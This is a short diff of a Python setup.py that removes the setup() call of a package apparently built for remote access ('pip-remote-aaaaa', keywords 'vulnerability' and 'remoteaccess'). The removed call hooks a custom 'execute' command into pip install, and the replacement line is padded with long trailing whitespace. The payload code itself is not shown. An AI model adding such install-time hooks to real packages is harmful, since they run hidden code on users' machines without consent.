@@ -112,21 +112,5 @@ CLASSIFIERS = [
         "License :: OSI Approved :: MIT License",
     ]
 # Setting up
-setup(
-    name="pip-remote-aaaaa",
-    version=VERSION,
-    author="The-Robin-Hood (Ansari)",
-    description=DESCRIPTION,
-    long_description= open('README.md').read(),
-    long_description_content_type="text/markdown",
-    packages=find_packages(),
-    url = "https://github.com/The-Robin-Hood/pip-remote-access",
-    project_urls = {
-        "Bug Tracker": "https://github.com/The-Robin-Hood/pip-remote-access/issues",
-    },
-    install_requires=[''],
-    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
-    classifiers= CLASSIFIERS,
-    cmdclass={'install': execute},
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
  
